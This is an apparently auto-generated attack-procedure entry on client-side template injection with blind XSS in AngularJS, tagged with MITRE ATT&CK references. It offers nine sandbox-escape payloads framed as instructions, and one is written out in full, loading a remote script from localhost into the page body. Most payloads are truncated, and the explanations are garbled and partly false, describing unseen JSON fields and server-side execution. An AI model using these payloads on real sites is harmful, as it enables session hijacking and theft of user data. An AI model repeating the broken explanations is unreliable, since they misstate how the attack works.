---
id: fde678fa-0e1a-4379-8b9a-2c7c504e9fa8
name: Client Side Template Injection using Blind XSS
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:43.766059+00:00'
updated_at: '2023-04-10T20:24:53.109447+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Blind XSS]]'
- '[[Client Side Template Injection]]'
- '[[XSS in Angular and AngularJS]]'
commands:
- '[[Run Script to create element]]'
---

# Client Side Template Injection using Blind XSS

## Summary

Client Side Template Injection (CSTI) is a type of injection attack that occurs when a web application uses a client-side template framework with user input in a way that enables an attacker to inject arbitrary JavaScript code. Blind XSS is a type of XSS attack where the attacker does not receive f

## Description

# Description

Client Side Template Injection (CSTI) is a type of injection attack that occurs when a web application uses a client-side template framework with user input in a way that enables an attacker to inject arbitrary JavaScript code. Blind XSS is a type of XSS attack where the attacker does not receive feedback from the server after the payload is injected. This makes it more difficult to detect and exploit, but also more dangerous as it allows an attacker to execute code without being detected. A successful CSTI attack can allow an attacker to execute arbitrary JavaScript code in the victim's browser, leading to data theft, session hijacking, and other malicious actions. This attack can be used to steal sensitive data, such as credit card numbers, passwords, and personal information.

 

## Requirements

1. Access to a vulnerable web application that uses a client-side template framework

1. Ability to inject malicious JavaScript code

 

## Defense

1. Validate and sanitize all user input to prevent injection attacks

1. Use Content Security Policy (CSP) to restrict the types of content that can be loaded by the web application

1. Regularly test the web application for vulnerabilities, including CSTI and XSS

 

## Objectives

1. Inject and execute arbitrary JavaScript code in the victim's browser

1. Steal sensitive data, such as credit card numbers, passwords, and personal information

 

# Instructions

1. This command injects a malicious script into a targeted website. The script is designed to perform unauthorized actions on the website, such as stealing user data or redirecting users to a phishing site.

 



**Code**: [[{{
    constructor.constructor("var _ = document.c]]



> The 'data' field contains the actual script that will be injected into the website. The script is executed by calling the constructor constructor method, which allows for the creation of a new script element and appending it to the body of the website. The 'lang' field specifies that the script is written in JavaScript. The 'text' field provides version information for the script. The 'instruction' field provides a brief overview of what the command does, while the 'explain' field provides additional details on the potential impact of this command.

2. The Shorter library is vulnerable to script injection attacks. An attacker can inject a malicious script into the library's source code and execute it on the victim's browser. Use the following commands to exploit this vulnerability:

 



**Code**: [[{{
    $on.constructor("var _ = document.createEle]]



> 1. Identify the target website that uses Shorter library.
2. Inject a malicious script into the Shorter library's source code.
3. The injected script will be executed on the victim's browser when they visit the target website.



**Command** ([[Run Script to create element]]):

```bash
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```



3. The $eval() function in AngularJS allows for arbitrary code execution. This vulnerability can be exploited by an attacker to inject malicious code into the application. To exploit this vulnerability, an attacker can inject a payload into the $eval() function that creates a new script element and appends it to the DOM with a source pointing to a remote server controlled by the attacker.

 



**Code**: [[{{
    a="a"["constructor"].prototype;a.charAt=a.t]]



> The $eval() function is used to evaluate an expression in the current scope. The function takes a string argument that is parsed as an expression and evaluated. This vulnerability arises when untrusted input is passed to the $eval() function. An attacker can inject arbitrary code into the expression, which will be executed in the context of the application. This can lead to various attacks, such as stealing sensitive data, modifying the application's behavior, or executing remote code.

4. This payload injects a script tag into the DOM of the vulnerable website, which then loads a JavaScript file from a local server (localhost/m) and appends it to the body of the page. This can be used to execute arbitrary code on the victim's browser.

 



**Code**: [[{{
    (_=''.sub).call.call({}[$='constructor'].ge]]



> The payload uses a technique called 'Function.call()' to execute the 'eval()' function in the context of the current window. It creates a script element and sets its 'src' attribute to the URL of the malicious JavaScript file. Finally, it appends the script element to the body of the page, causing the browser to load and execute the code in the file.

5. This command injects a malicious script into a webpage. It first overrides the toString method of the constructor prototype to bypass any security measures in place. It then creates a script element and sets its source to a remote location. Finally, it appends the script element to the body of the webpage.

 



**Code**: [[{{
    toString.constructor.prototype.toString=toS]]



> The 'data' field contains the actual code that is injected into the webpage. The 'lang' field specifies that the code is written in JavaScript. The 'text' field indicates the version of Firefox that the code was tested on. The 'instruction' field provides a detailed explanation of how the code works and what it does.

6. This command exploits a vulnerability known as Prototype Pollution to execute arbitrary code on the target system. The command injects a script tag into the page with a source pointing to a malicious script hosted on a local server. Once the script is executed, the attacker can take full control of the target system.

 



**Code**: [[{{
    a="a"["constructor"].prototype;a.charAt=a.t]]



> The command takes advantage of the fact that in JavaScript, objects inherit properties and methods from their prototype. By modifying the prototype of a commonly used object, such as the String object, an attacker can inject malicious code into the running application. In this case, the command modifies the prototype of the String object to include a new method called $eval, which takes a string of JavaScript code as an argument and executes it. The command then calls $eval with a string that creates a new script tag and appends it to the page, which executes the malicious script hosted on the attacker's server.

7. This command exploits a vulnerability known as JavaScript Prototype Pollution. It allows an attacker to modify the prototype of an object and add or modify properties, which can lead to arbitrary code execution.

 



**Code**: [[{{
    a=toString().constructor.prototype;a.charAt]]



> The 'data' field contains the payload that will be executed on the target server. The payload creates a script element and appends it to the body of the HTML document. The source of the script element points to a malicious script hosted on the attacker's server, which will be executed on the target server. The 'text' field provides information about the version of the exploit and the author. The 'lang' field specifies the language of the payload, which is JavaScript in this case. The 'instruction' field provides a brief explanation of what the command does and the vulnerability it exploits. The 'explain' field provides additional details about the exploit and how it works.

8. This payload is used to inject malicious scripts into a webpage's DOM, which can be used to perform a DOM-based XSS attack. The payload uses JavaScript's `toString()` method to access the `String` prototype's `constructor` property, and then modifies the `charAt()` method to trim whitespace. It then uses the `$eval()` function to execute a script that creates a new `script` element, sets its `src` attribute to a malicious script hosted on the attacker's server, and appends it to the document's `body` element.

 



**Code**: [[{{
    a=toString().constructor.prototype;a.charAt]]



> The payload can be used in conjunction with other attack vectors, such as social engineering or CSRF attacks, to execute the injected script in the context of a victim's browser session. This can allow an attacker to steal sensitive information, such as login credentials or session cookies, or to perform actions on behalf of the victim, such as making unauthorized purchases or posting malicious content.

9. This command is used to inject malicious Javascript code into a web page. The injected code creates a script element with a source pointing to a local host, appends it to the document body, and executes the script. This allows the attacker to execute arbitrary code on the victim's machine.

 



**Code**: [[{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;]]



> The code injection works by exploiting a vulnerability in AngularJS v1.5.9 - v1.5.11. The vulnerability allows an attacker to bypass the built-in protections against code injection and execute arbitrary code on the victim's machine. The injected code creates a script element with a source pointing to a local host, appends it to the document body, and executes the script. This allows the attacker to execute arbitrary code on the victim's machine.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Run Script to create element]]

## Tags

- [[Blind XSS]]
- [[Client Side Template Injection]]
- [[XSS in Angular and AngularJS]]


